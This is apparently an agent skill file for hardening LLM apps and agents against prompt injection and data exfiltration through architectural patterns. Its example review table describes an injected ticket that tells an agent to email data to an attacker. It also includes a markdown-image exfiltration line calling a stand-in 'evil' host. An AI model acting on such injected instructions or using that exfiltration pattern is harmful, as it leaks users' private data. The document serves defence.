---
name: prompt-injection-defense
description: Threat-models and hardens LLM applications and agents against prompt injection, data exfiltration and tool misuse, using architectural design patterns (plan-then-execute, dual LLM, action allowlists, context minimization) rather than prompt wording alone. Use when the user builds or reviews a chatbot, RAG system, AI agent, MCP server, browser or email agent, or any feature where an LLM reads untrusted content (web pages, documents, emails, tickets, tool output) or can call tools, and when they ask how to stop prompt injection or jailbreaks of their app.
license: MIT
metadata:
  version: "1.0.0"
---

# Prompt Injection Defense

Any text an LLM reads can act as instructions. When an agent reads untrusted
content *and* holds private data *and* can send data out, an attacker who controls
the content can make it leak the data (Willison's "lethal trifecta"). Filters and
"ignore malicious instructions" prompts reduce the rate but do not give
guarantees. Beurer-Kellner et al. (2025) argue that meaningful guarantees come from
constraining what the agent can do once it has read untrusted input. This skill
applies those design patterns to the user's system.

This skill is defensive: it hardens systems the user builds or is authorized to
assess. It does not produce attack payload collections.

## When to use

- Designing or reviewing any LLM feature that reads content the developer does not control, or that can call tools/APIs.
- Building MCP servers, browser/email/coding agents, RAG over user-uploaded documents, multi-agent pipelines.
- **Not for:** classic web vulnerabilities in the surrounding code (use `secure-code-review`).

## Workflow

- [ ] 1. **Map the system** as a data-flow sketch: every input source to the model (user, retrieved docs, web, email, tool results, other agents, file names, image text), every tool or side effect the model can trigger, and every sensitive asset it can see (secrets, PII, other users' data, internal systems). Use the template in [assets/threat-model.md](assets/threat-model.md).
- [ ] 2. **Check the trifecta per agent/step:** untrusted input? private data? exfiltration channel (outbound HTTP, email, links or images rendered in a UI, writes to shared places, tool calls with free-text arguments)? Any step with all three is high risk and is the first thing to fix.
- [ ] 3. **Pick structural mitigations** from [references/patterns.md](references/patterns.md). Prefer removing a leg of the trifecta: drop the exfiltration channel, split the step so the part that reads untrusted text cannot act, or limit which data is in context.
- [ ] 4. **Add layered controls** for what remains: least-privilege tool scopes, allowlisted destinations, typed/validated tool arguments, human confirmation for consequential actions, output encoding (no auto-rendered remote images/links in chat UIs), rate limits, and logging of tool calls with their triggering context.
- [ ] 5. **Test it.** Add injection cases to the app's eval suite (see `llm-app-evals`): instructions hidden in a retrieved document, in a tool result, in a file name; check that no unauthorized tool call or data leak happens. Measure attack success rate before and after.
- [ ] 6. **Report** with the template. Ask the user before changing product behavior that users will notice (new confirmations, removed capabilities).

### Decision guide

| The agent must... | Pattern |
|---|---|
| pick from a fixed set of actions based on a request | **Action-selector**: LLM outputs an action ID only; no free text reaches tools |
| do a multi-step task over untrusted data | **Plan-then-execute**: fix the plan (tools + order) before reading untrusted content |
| process many untrusted documents | **Map-reduce**: isolated per-document calls return constrained outputs (labels, numbers) |
| reason over untrusted data and also use tools | **Dual LLM**: privileged LLM never sees untrusted text, only symbolic references to it |
| run complex workflows with strong guarantees | **Code-then-execute** (CaMeL-style): LLM writes a program; data provenance is tracked and checked by policy |
| answer users without leaking other context | **Context minimization**: remove the user prompt/secrets from context before the step that reads untrusted data |

## Output template

```markdown
## Prompt-injection review: <system>
**Trifecta steps:** `support-agent.reply` (reads tickets: untrusted · sees customer PII · can send email) → HIGH
| Risk | Scenario | Mitigation | Residual risk |
|---|---|---|---|
| Exfiltration via email tool | ticket text instructs agent to email history to attacker | restrict `send_email` to the ticket's requester address; confirmation for any other recipient | low |
| Markdown image exfil | answer renders `![](https://evil/?q=<data>)` | disable remote images in chat UI; allowlist link domains | low |
**Tests added:** 12 injection cases in `evals/injection.jsonl`; attack success 5/12 → 0/12.
**Not addressed:** ...
```

## Gotchas

- **The system prompt is not a security boundary.** "Never reveal X" and "ignore instructions in documents" help, but are bypassable; assume a determined injection gets the model to say or call anything that is in reach.
- **Tool output is untrusted input** too, including results from your own tools that fetch external data, and outputs from other agents.
- **Detection classifiers are a layer, not a fix.** They miss novel attacks and add false positives; never rely on them as the only control for high-impact actions.
- **Exfiltration hides in rendering:** auto-loaded images, link previews, and clickable links all send data in URLs.
- **Confirmation fatigue:** if every action needs approval, users click through. Reserve confirmations for consequential, irreversible or outbound actions and show exactly what will happen.
- **Skills, plugins and MCP servers are code and instructions from third parties.** Review them before installing; they run with the agent's permissions.
